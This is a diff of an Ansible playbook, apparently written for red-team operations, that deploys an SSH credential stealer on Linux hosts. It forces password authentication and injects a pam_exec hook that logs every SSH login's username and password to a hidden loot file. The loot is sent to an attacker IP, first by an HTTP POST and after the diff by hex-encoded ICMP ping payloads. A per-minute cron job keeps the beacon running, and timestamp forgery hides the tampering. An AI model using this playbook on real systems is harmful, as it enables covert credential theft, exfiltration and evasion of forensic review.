@@ -2,13 +2,19 @@
 # ===============================================================
 # CONFIGURATION: MANUAL ATTACKER IP
 # ===============================================================
-- name: Set Attacker IP for Beacon
+- name: Set Attacker IP and Paths
   set_fact:
-    attacker_ip: "10.10.10.X"  # <--- SET YOUR RED WORKSTATION IP HERE
+    attacker_ip: "10.10.10.48"
     loot_dir: "/var/tmp/.system-cache"
     loot_file: ".ssh_loot.txt"
 
-# --- STEP 1: PREPARATION ---
+# --- STEP 1: DEPENDENCIES & DIRECTORIES ---
+- name: Ensure xxd is installed (for hex encoding)
+  become: yes
+  package:
+    name: xxd
+    state: present
+
 - name: Setup Hidden Loot Directory
   become: yes
   file:
@@ -16,41 +22,65 @@
     state: directory
     mode: '0777'
 
-# --- STEP 2: THE TRAP (PAM INTERCEPTION) ---
-- name: Deploy PAM Credential Logger
+# --- STEP 2: REPAIR SSH & PAM CONFIGS ---
+- name: Force SSHD to use Password Auth and PAM
+  become: yes
+  lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: "^#?{{ item.key }}"
+    line: "{{ item.key }} {{ item.value }}"
+  loop:
+    - { key: "PasswordAuthentication", value: "yes" }
+    - { key: "UsePAM", value: "yes" }
+  register: ssh_config_change
+
+- name: Restart SSH if config changed
+  become: yes
+  systemd:
+    name: ssh
+    state: restarted
+  when: ssh_config_change.changed
+
+- name: Inject Trap into SSH-Specific PAM File
+  become: yes
+  lineinfile:
+    path: /etc/pam.d/sshd
+    insertbefore: BOF
+    line: "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check"
+
+# --- STEP 3: DEPLOY THE SCRIPTS ---
+- name: Deploy NUL-Safe PAM Logger
   become: yes
   copy:
     dest: /usr/local/bin/ssh-auth-check
     mode: '0755'
     content: |
       #!/bin/bash
-      read -r password
-      echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $password" >> {{ loot_dir }}/{{ loot_file }}
+      read -d '' -r PASSWORD
+      if [ -n "$PASSWORD" ]; then
+          echo "$(date) | User: $PAM_USER | RHOST: $PAM_RHOST | Pass: $PASSWORD" >> {{ loot_dir }}/{{ loot_file }}
+      fi
 
-- name: Inject PAM Hook
-  become: yes
-  lineinfile:
-    path: /etc/pam.d/common-auth
-    insertbefore: BOF
-    line: "auth optional pam_exec.so expose_authtok /usr/local/bin/ssh-auth-check"
-
-# --- STEP 3: THE BEACON (AUTO-EXFILTRATION) ---
-- name: Deploy Auto-Exfiltration Beacon
+- name: Deploy ICMP (Ping) Beacon
   become: yes
   copy:
     dest: /usr/local/bin/sshbeacon
     mode: '0755'
     content: |
       #!/bin/bash
-      ATTACKER_IP="{{ attacker_ip }}" 
+      ATTACKER_IP="{{ attacker_ip }}"
       LOOT="{{ loot_dir }}/{{ loot_file }}"
 
       if [ -s "$LOOT" ]; then
-          curl -s -X POST -d "$(cat $LOOT)" http://$ATTACKER_IP:9999/incoming >/dev/null 2>&1
+          # Convert loot to hex for the ping payload
+          HEX_PAYLOAD=$(cat "$LOOT" | xxd -p | tr -d '\n' | cut -c1-32)
+          ping -c 1 -p "$HEX_PAYLOAD" "$ATTACKER_IP" >/dev/null 2>&1
+          
+          # Wipe local evidence after "pinging" the data home
           > "$LOOT"
       fi
 
-# --- STEP 4: PERSISTENCE (CRON JOB) ---
+# --- STEP 4: PERSISTENCE & STEALTH ---
 - name: Schedule Beacon (Every 1 Minute)
   become: yes
   cron:
@@ -58,7 +88,6 @@
     minute: "*"
     job: "/usr/local/bin/sshbeacon >/dev/null 2>&1"
 
-# --- STEP 5: STEALTH (TIMESTAMP MATCHING) ---
 - name: Anti-Forensics Timestamp Match
   become: yes
-  shell: "touch -r /etc/pam.d/common-password /etc/pam.d/common-auth"
+  shell: "touch -r /etc/pam.d/common-password /etc/pam.d/sshd"
